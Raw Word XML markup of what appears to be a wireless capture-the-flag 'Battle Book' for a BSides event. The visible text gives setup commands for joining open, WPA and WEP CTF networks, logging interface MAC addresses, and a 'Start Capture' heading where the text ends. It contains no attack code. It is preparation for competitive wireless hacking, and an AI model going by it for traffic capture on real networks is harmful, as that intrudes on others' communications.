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BA2E4" w14:textId="77777777" w:rsidR="00062401" w:rsidRDefault="00C00747" w:rsidP="003C5340">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>DaKahuna</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00480CC6" w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00480CC6" w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>SimonJ</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00062401" w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00062401" w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>TheRedBaron</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300751AD" w14:textId="7644C33E" w:rsidR="00585754" w:rsidRPr="00062401" w:rsidRDefault="0012418B" w:rsidP="003C5340">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00062401">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Battle Book</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D535A3" w14:textId="77777777" w:rsidR="00C00747" w:rsidRDefault="00C00747" w:rsidP="003C5340">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12D9D339" w14:textId="09C80A9C" w:rsidR="00E0380B" w:rsidRPr="00056E54" w:rsidRDefault="00056E54" w:rsidP="00056E54">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 xml:space="preserve">Setup – </w:t>
      </w:r>
      <w:r w:rsidR="00E0380B" w:rsidRPr="00056E54">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Associate wlan0 to CTF open </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E0380B" w:rsidRPr="00056E54">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Wifi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E0380B" w:rsidRPr="00056E54">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to email flags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4988E34F" w14:textId="77777777" w:rsidR="000C69E8" w:rsidRDefault="000C69E8" w:rsidP="000C69E8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3600316F" w14:textId="77777777" w:rsidR="003975DE" w:rsidRDefault="003975DE" w:rsidP="003975DE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Open network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40754DCF" w14:textId="77777777" w:rsidR="003975DE" w:rsidRPr="005408E2" w:rsidRDefault="003975DE" w:rsidP="003975DE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:outlineLvl w:val="1"/>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iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> “WCTF”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1CFC1A" w14:textId="77777777" w:rsidR="003975DE" w:rsidRDefault="003975DE" w:rsidP="000C69E8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="238530FB" w14:textId="77777777" w:rsidR="00515BA7" w:rsidRPr="004B27DE" w:rsidRDefault="00515BA7" w:rsidP="004B27DE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B27DE">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>WPA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B4DA82" w14:textId="77777777" w:rsidR="00C16128" w:rsidRPr="000C69E8" w:rsidRDefault="00E21BA5" w:rsidP="00FB3D55">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wpa</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>_passphrase</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B223EB" w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSides-wifi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B223EB" w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> password &gt; /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B223EB" w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B223EB" w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B223EB" w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wpa_supplicant</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B223EB" w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B223EB" w:rsidRPr="000C69E8">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wpa_supplicant.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="002F9874" w14:textId="77777777" w:rsidR="00B223EB" w:rsidRDefault="00B223EB" w:rsidP="00E21BA5">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CF84AD8" w14:textId="77777777" w:rsidR="000C69E8" w:rsidRPr="00C70BD1" w:rsidRDefault="000C69E8" w:rsidP="00FB3D55">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wpa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5C1CDC" w14:textId="77777777" w:rsidR="000C69E8" w:rsidRDefault="000C69E8" w:rsidP="00E21BA5">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58BC9541" w14:textId="77777777" w:rsidR="00F477A7" w:rsidRDefault="00F477A7" w:rsidP="00F477A7">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Associate to WEP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8B4400" w14:textId="6F36D9E9" w:rsidR="00F477A7" w:rsidRPr="003975DE" w:rsidRDefault="00AE04E9" w:rsidP="003975DE">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:firstLine="720"/>
        <w:outlineLvl w:val="1"/>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iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0 mode managed key [key]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF1D95C" w14:textId="23210217" w:rsidR="00056E54" w:rsidRPr="00056E54" w:rsidRDefault="00056E54" w:rsidP="00056E54">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00056E54">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Setup CTF docs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673D5107" w14:textId="77777777" w:rsidR="00071C0E" w:rsidRPr="00071C0E" w:rsidRDefault="00071C0E" w:rsidP="00071C0E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="365A6C56" w14:textId="77777777" w:rsidR="00E0380B" w:rsidRPr="00FB3D55" w:rsidRDefault="006A34C8" w:rsidP="00FB3D55">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>touch</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00FB3D55">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /root/Desktop/notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45FADD35" w14:textId="77777777" w:rsidR="006A34C8" w:rsidRDefault="006A34C8" w:rsidP="00E0380B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44051C69" w14:textId="77777777" w:rsidR="003773EA" w:rsidRDefault="003773EA" w:rsidP="003773EA">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Get my macs</w:t>
      </w:r>
      <w:r w:rsidR="00657403">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and paste into notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131FC00A" w14:textId="77777777" w:rsidR="00657403" w:rsidRDefault="00657403" w:rsidP="003773EA">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4416F595" w14:textId="77777777" w:rsidR="003773EA" w:rsidRPr="003773EA" w:rsidRDefault="003773EA" w:rsidP="003773EA">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t>ifconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003773EA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD82694" w14:textId="77777777" w:rsidR="00657403" w:rsidRDefault="00657403" w:rsidP="003773EA">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="624CC040" w14:textId="77777777" w:rsidR="003773EA" w:rsidRPr="003773EA" w:rsidRDefault="003773EA" w:rsidP="003773EA">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t>ifconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003773EA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357831D7" w14:textId="77777777" w:rsidR="00657403" w:rsidRDefault="00657403" w:rsidP="003773EA">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F1CCFBC" w14:textId="77777777" w:rsidR="003773EA" w:rsidRDefault="003773EA" w:rsidP="003773EA">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t>ifconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003773EA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5A35D6" w14:textId="77777777" w:rsidR="003773EA" w:rsidRPr="003773EA" w:rsidRDefault="003773EA" w:rsidP="00657403">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F8DAC02" w14:textId="0F80623C" w:rsidR="00E04247" w:rsidRDefault="00E04247" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36EB790C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="028F87B9" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25AE7341" w14:textId="77777777" w:rsidR="00002BA9" w:rsidRPr="00E04247" w:rsidRDefault="00002BA9" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32BA4B81" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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lastRenderedPageBreak/>
        <w:t>St</w:t>
      </w:r>
      <w:r w:rsidRPr="00C3132B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>art Capture</w:t>
      </w:r>
    </w:p>
